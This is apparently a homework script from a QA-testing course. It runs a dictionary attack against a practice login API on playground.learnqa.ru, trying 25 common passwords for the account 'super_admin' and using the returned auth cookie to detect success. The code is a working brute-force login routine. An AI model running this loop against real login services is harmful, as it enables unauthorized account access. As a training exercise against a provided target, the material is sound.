import requests
passw=['123456', '123456789','qwerty','password','1234567','12345678','12345','iloveyou','11111','123123','abc123','qwerty123','1q2w3e4r','admin','qwertyuiop','654321','555555','lovely','7777777','welcome','888888','princess','dragon','password1','123qwe']
test=True
for i in passw:
    if test==True:
        payload={"login":"super_admin","password":i}
        response=requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
        cookie_value = response.cookies.get('auth_cookie')
        cookies = {'auth_cookie': cookie_value}
        response1=requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
        if response1.text=="You are authorized":
            test=False
            print('пароль', i)
            print(response1.text)